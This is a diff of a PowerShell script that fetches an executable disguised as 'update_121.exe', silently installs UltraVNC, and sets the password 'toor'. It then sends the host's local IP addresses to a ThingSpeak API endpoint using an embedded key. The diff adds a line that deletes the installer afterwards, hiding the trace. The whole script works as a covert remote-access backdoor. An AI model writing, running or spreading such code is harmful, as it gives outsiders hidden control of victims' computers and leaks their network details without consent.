@@ -15,7 +15,7 @@ $client.DownloadFile("https://raw.githubusercontent.com/srbhptl39/automation/mas
 #$client.DownloadFile("https://raw.githubusercontent.com/srbhptl39/automation/master/ultravnc.ini","$Env:USERPROFILE\update_121.ini");
 & $Env:USERPROFILE\update_121.exe /SP- /VERYSILENT /NORESTART -ErrorAction Stop
 #Copy-Item -Path $Env:USERPROFILE\update_121.ini -Destination 'C:\Program Files\uvnc bvba\UltraVNC\ultravnc.in' -ErrorAction Stop
-Start-Sleep -Seconds 3 -ErrorAction Stop
+Start-Sleep -Seconds 2 -ErrorAction Stop
 & 'C:\Program Files\uvnc bvba\UltraVNC\setpasswd.exe' "toor";
 #& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -install;
 Start-Sleep -Seconds 1 -ErrorAction Stop
@@ -26,5 +26,7 @@ $ipa3 =(Get-NetIPAddress -AddressState Preferred -AddressFamily IPv4 | Select-Ob
 $url = "https://api.thingspeak.com/update?api_key=F15031FIFGY353KO&field1=$ipa&field2=$ipa2&field3=$ipa3";
 (New-Object System.Net.WebClient).DownloadString($url)
 Invoke-WebRequest $url -Method Get
+Remove-Item –path "$Env:USERPROFILE\update_121.exe"
 exit;
+
 
